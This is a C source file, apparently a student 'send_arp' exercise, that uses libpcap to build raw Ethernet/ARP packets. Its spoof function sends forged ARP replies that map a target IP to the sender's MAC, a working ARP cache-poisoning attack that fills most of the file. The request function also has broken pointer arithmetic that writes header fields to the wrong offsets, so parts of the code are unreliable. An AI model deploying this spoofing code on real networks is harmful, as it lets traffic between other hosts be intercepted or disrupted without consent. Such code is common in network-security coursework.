#include <stdio.h>
#include <string.h>
#include "send_arp.h"
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <netinet/ether.h>
#include <unistd.h>

void print_len(uint8_t* s, int num){
	for(int i = 0; i< num; ++i)
		printf("%x ",s[i]);
}

void get_myIpaddr(uint32_t* IP_addr, char* interface){
	int sock = socket(AF_INET, SOCK_DGRAM, 0);
	struct ifreq ifr;
	struct sockaddr_in* sin;

	ifr.ifr_addr.sa_family = AF_INET;
	strncpy(ifr.ifr_name, interface, IFNAMSIZ-1);
	ioctl(sock, SIOCGIFADDR, &ifr);

	sin = (struct sockaddr_in*)&ifr.ifr_addr;

	*IP_addr =(uint32_t) sin->sin_addr.s_addr;
	close(sock);
	printf("get_myIPaddr func finish!\n");
}

void get_myMacaddr(uint8_t*  mac, char* interface){
	int sock;
	struct ifreq ifr;
	char mac_adr[18] = {0,}; 

	sock = socket(AF_INET, SOCK_STREAM, 0);

	strcpy(ifr.ifr_name, interface);
	ioctl(sock, SIOCGIFHWADDR, &ifr);
	
	memcpy(mac, ifr.ifr_hwaddr.sa_data,6);
	close(sock);
	printf("get_mymacaddr func finish\n");
}


void arp_send_pkt_req(uint8_t* send_mac, uint8_t* send_ip, uint8_t* mymac, uint8_t* myip, pcap_t* handle){
	struct ethernet_hdr* arp_req_ether_hdr;
	struct arp_head* arp_req_arp_hdr;

	uint8_t packet[arp_hdr_len + eth_hdr_len];
	struct pcap_pkthdr* header;
	uint8_t* rcvpkt;

	arp_req_ether_hdr = (struct ethernet_hdr*)packet;
	arp_req_arp_hdr = (struct arp_head*)(packet + 14);

	printf("%x %x %d\n",arp_req_ether_hdr, arp_req_arp_hdr,sizeof(packet));
	//request packet ethernet_head
	memset(arp_req_ether_hdr, 0xff, 6);
	memcpy(arp_req_ether_hdr + 6, mymac, 6);
	arp_req_ether_hdr->type = 0x0608;
	printf("arp header\n");
	//request packet arp_head
	*(uint16_t*)(arp_req_arp_hdr+14) = 0x0100;
	printf("0");
	arp_req_arp_hdr->protocol_type = 0x0008;
	arp_req_arp_hdr->hardware_addr_len = 6;
	printf("4");
	arp_req_arp_hdr->protocol_addr_len = 4;
	arp_req_arp_hdr-> Opcode = 0x0100;
	printf("1");
	memcpy(arp_req_arp_hdr->source_hard_addr, mymac, 6);
	printf("2");
	memcpy(arp_req_arp_hdr->source_protocol_addr, myip, 4);
	memset(arp_req_arp_hdr->dest_hard_addr, 0, 6);
	memcpy(arp_req_arp_hdr->dest_protocol_addr , send_ip, 4);
	
	printf("req start\n");
	pcap_sendpacket(handle, packet, eth_hdr_len + arp_hdr_len);

	while(1){
		pcap_next_ex(handle, &header,(const u_char **)&rcvpkt);
		printf("%d\n",ntohs(*((uint16_t*)(rcvpkt+12))));
		if(ntohs(*((uint16_t*)(rcvpkt+12))) == 0x0806){
			if(memcmp(rcvpkt+28,send_ip,4)==0){
				memcpy(send_mac, rcvpkt + 22, 6);
				break;
			}
			memcpy(send_mac, rcvpkt + 22, 6);
			uint8_t des_mac[6];
			memcpy(des_mac, rcvpkt + 32,6);
			print_len(des_mac,6);
			printf("not same IP\n");
			print_len(send_mac,6);
		}
		printf("not ARP packet\n");
		
	}
	printf("req end\n");
}


void arp_send_pkt_spoof(uint8_t* target_ip, uint8_t* send_mac, uint8_t* send_ip, uint8_t* mymac, uint8_t* myip, pcap_t* handle){
	struct ethernet_hdr* arp_sp_ether_hdr;
	struct arp_head* arp_sp_arp_hdr;
	
	uint8_t packet[arp_hdr_len + eth_hdr_len];

	arp_sp_ether_hdr = (struct ethernet_hdr*)packet;
	arp_sp_arp_hdr = (struct arp_head*)(packet + eth_hdr_len);
	
	//spoof packet ethernet_head
	memcpy(arp_sp_ether_hdr->dhost, send_mac, 6);
	memcpy(arp_sp_ether_hdr->shost, mymac, 6);
	arp_sp_ether_hdr->type = 0x0608;
	
	print_len(mymac, 6);

	//spoof packet arp_head
	arp_sp_arp_hdr->hardware_type = 0x0100;
        arp_sp_arp_hdr->protocol_type = 0x0008;
        arp_sp_arp_hdr->hardware_addr_len = 6;
        arp_sp_arp_hdr->protocol_addr_len = 4;
        arp_sp_arp_hdr-> Opcode = 0x0200;
        memcpy(arp_sp_arp_hdr->source_hard_addr, mymac, 6);
        memcpy(arp_sp_arp_hdr->source_protocol_addr, target_ip, 4);
        memcpy(arp_sp_arp_hdr->dest_hard_addr, send_mac, 6);
        memcpy(arp_sp_arp_hdr->dest_protocol_addr , send_ip, 4);	
	
	print_len(packet,42);

	pcap_sendpacket(handle, packet, eth_hdr_len + arp_hdr_len);
}
